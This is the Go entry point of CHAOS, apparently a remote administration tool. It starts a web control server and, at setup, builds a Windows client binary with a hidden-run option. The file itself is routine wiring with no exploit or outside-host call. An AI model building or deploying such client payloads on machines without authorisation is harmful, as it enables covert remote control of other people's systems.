package main

import (
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/go-playground/validator/v10"
	"github.com/jinzhu/gorm"
	"github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/database"
	httpDelivery "github.com/tiagorlampert/CHAOS/delivery/http"
	"github.com/tiagorlampert/CHAOS/middleware"
	"github.com/tiagorlampert/CHAOS/repositories/sqlite"
	"github.com/tiagorlampert/CHAOS/services"
	"github.com/tiagorlampert/CHAOS/shared/environment"
	"github.com/tiagorlampert/CHAOS/shared/utils/constant"
	"github.com/tiagorlampert/CHAOS/shared/utils/system"
	"github.com/tiagorlampert/CHAOS/shared/utils/template"
	"github.com/tiagorlampert/CHAOS/shared/utils/ui"
	"net/http"
	"strings"
	"time"
)

const AppName = "CHAOS"

var Version = "dev "

type App struct {
	Configuration  *environment.Configuration
	Logger         *logrus.Logger
	TimeoutHandler http.Handler
	ClientService  services.Client
}

func init() {
	system.ClearScreen()
}

func main() {
	log := logrus.New()
	log.Info(`Loading environment variables`)

	cfg := environment.LoadEnv()
	validate := validator.New()
	if err := validate.Struct(cfg); err != nil {
		log.WithField(`cause`, err.Error()).Fatal(`error validating environment config variables`)
	}

	ui.ShowMenu(Version, cfg.Server.Port)

	db, err := database.NewSQLiteClient(cfg.Database.Name)
	if err != nil {
		log.WithField(`cause`, err).Fatal(`error connecting with database`)
	}

	if err := NewApp(log, cfg, db.Conn).Run(); err != nil {
		log.WithField(`cause`, err).Fatal(fmt.Sprintf("failed to start %s Application", AppName))
	}
}

func NewApp(log *logrus.Logger, config *environment.Configuration, database *gorm.DB) *App {
	//repositories
	systemRepository := sqlite.NewSystemRepository(database)
	userRepository := sqlite.NewUserRepository(database)
	deviceRepository := sqlite.NewDeviceRepository(database)

	//services
	payloadService := services.NewPayload()
	systemService := services.NewSystem(systemRepository, userRepository)
	userService := services.NewUser(userRepository)
	deviceService := services.NewDevice(deviceRepository)
	clientService := services.NewClient(Version, systemRepository, payloadService, systemService)

	//router
	router := gin.Default()
	router.Use(gin.Recovery())
	router.Static("/static", "web/static")
	router.HTMLRender = template.LoadTemplates("web")

	params, err := systemService.Load()
	if err != nil {
		log.WithField(`cause`, err).Fatal(`error loading system params`)
	}
	jwtMiddleware, err := middleware.NewJWTMiddleware(params.SecretKey, userService)
	if err != nil {
		log.WithField(`cause`, err).Fatal(`error creating jwt middleware`)
	}

	httpDelivery.NewController(config, router, log, jwtMiddleware, clientService, systemService, payloadService, userService, deviceService)

	return &App{
		Configuration:  config,
		Logger:         log,
		TimeoutHandler: http.TimeoutHandler(router, time.Second*60, constant.TimeoutExceeded),
		ClientService:  clientService,
	}
}

func (a *App) Setup() error {
	if err := system.CreateDirectory(constant.TempDirectory); err != nil {
		return fmt.Errorf("error creating temp directory: %w", err)
	}
	if err := system.CreateDirectory(constant.DatabaseDirectory); err != nil {
		return fmt.Errorf("error creating database directory: %w", err)
	}

	//first time building binary take some time
	//handle issue running at startup
	go a.ClientService.BuildClient(services.BuildClientBinaryInput{
		ServerAddress: "localhost",
		ServerPort:    "8080",
		Filename:      "test",
		RunHidden:     false,
		OSTarget:      system.Windows,
	})
	return nil
}

func (a *App) Run() error {
	if err := a.Setup(); err != nil {
		return err
	}
	a.Logger.WithFields(logrus.Fields{`version`: strings.TrimSpace(Version), `port`: a.Configuration.Server.Port}).Info(`Starting `, AppName)
	return http.ListenAndServe(fmt.Sprintf(":%s", a.Configuration.Server.Port), a.TimeoutHandler)
}
